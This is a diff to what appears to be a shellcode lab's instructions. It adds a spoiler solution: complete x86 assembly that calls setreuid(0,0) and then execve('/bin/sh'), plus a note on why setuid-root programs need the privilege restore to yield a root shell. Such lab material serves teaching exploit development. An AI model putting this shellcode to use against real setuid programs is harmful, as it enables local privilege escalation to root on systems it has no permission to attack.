@@ -41,13 +41,7 @@
     * int setreuid(uid_t *ruid*, uid_t *euid*);
     * int execve(const char **pathname*, char **const* _Nullable *argv[]*, char *const _Nullable *envp[]*);
 
-### Hint 3: Other Assembly Hints
-#### `setreuid`
-Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)
-
-* 
-
-### Hint 4: Execution
+### Hint 3: Execution
 
 1. Compile & Execute
 
@@ -57,6 +51,37 @@ Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.h
 
    c. Execute the output
 
+</details>
 
+## Solution
+<details>
+  <summary><b>SPOILERS</b></summary>
+
+    .data
+    filepath:
+            .string "/bin/shXAAAABBBB"
+    .text
+    .global _start
+    _start:
+            movl $70, %eax
+            movl $0, %ebx
+            movl $0, %ecx
+            int $0x80
+    
+            movl $0, %eax
+            movl $filepath, %ebx
+            movb %al, 7(%ebx)
+            movl %ebx, 8(%ebx)
+            movl %eax, 12(%ebx)
+    
+            movl $11, %eax
+            leal 8(%ebx), %ecx
+            leal 12(%ebx), %edx
+            int $0x80
+
+### `setreuid`
+Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)
+
+* `setuid` root programs usually drop root privileges for the security purposes. Therefore, even if a shellcode has the `setuid` bit, if it runs only `execve`, it will always spawn a normal user shell for the normal user.
 
 </details>
